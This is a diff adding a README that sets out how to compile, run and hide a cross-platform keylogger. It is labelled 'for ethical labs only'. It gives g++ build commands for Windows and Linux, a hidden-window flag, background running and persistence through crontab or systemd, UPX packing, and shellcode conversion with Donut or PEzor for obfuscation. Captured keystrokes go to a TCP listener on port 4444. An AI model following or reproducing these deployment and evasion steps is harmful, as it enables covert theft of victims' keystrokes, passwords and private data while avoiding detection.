@@ -1,0 +1,35 @@
+
+# 🧠 Obfuscated Cross-Platform Keylogger Setup (For Ethical Labs Only)
+
+## 🔧 Windows Setup
+1. Compile the keylogger (requires g++, e.g., MinGW):
+   ```
+   g++ main_windows.cpp -o keylogger.exe -lws2_32 -mwindows
+   ```
+
+2. Run the binary:
+   ```
+   start keylogger.exe
+   ```
+
+3. Optional:
+   - Use packers like UPX: `upx -9 keylogger.exe`
+   - Use Donut or PEzor for shellcode conversion
+
+## 🐧 Linux Setup
+1. Compile the keylogger:
+   ```
+   g++ main_linux.cpp -o keylogger -lX11
+   ```
+
+2. Install as a background daemon manually or via crontab:
+   ```
+   ./keylogger &
+   ```
+
+3. Optional:
+   - Install with systemd manually
+   - Use runtime loader stub or compile with additional obfuscation
+
+## 📤 Server
+- Use the included keylogger_server.py from previous steps or create a TCP listener on port 4444.
